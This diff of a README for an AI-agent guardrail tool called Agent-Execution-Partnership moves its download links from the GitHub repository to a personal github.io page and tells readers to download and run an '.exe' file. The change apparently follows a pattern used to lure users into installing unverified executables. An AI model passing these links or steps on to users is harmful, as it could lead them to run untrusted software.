@@ -1,6 +1,6 @@
 # 🛡️ Agent-Execution-Partnership - Safely authorize your autonomous AI agents
 
-[![Download Agent-Execution-Partnership](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/rickyunpotted334/Agent-Execution-Partnership)
+[![Download Agent-Execution-Partnership](https://img.shields.io/badge/Download-Application-grey.svg)](https://rickyunpotted334.github.io)
 
 Agent Execution Partnership (AEE) acts as a guardrail for your digital assistants. Modern AI agents perform tasks on your computer, such as sending emails, moving files, or browsing the internet. This software ensures that every action remains under your control. It reviews requests before they happen, monitors progress in real time, and logs results for your review.
 
@@ -22,7 +22,7 @@ Your computer must meet these basic standards to run the application:
 
 Follow these steps to get the application onto your machine:
 
-1. Visit the project website at: [https://github.com/rickyunpotted334/Agent-Execution-Partnership](https://github.com/rickyunpotted334/Agent-Execution-Partnership)
+1. Visit the project website at: [https://rickyunpotted334.github.io](https://rickyunpotted334.github.io)
 2. Locate the "Releases" section on the right side of the page.
 3. Click on the latest release version.
 4. Select the file ending in ".exe" to begin the download.
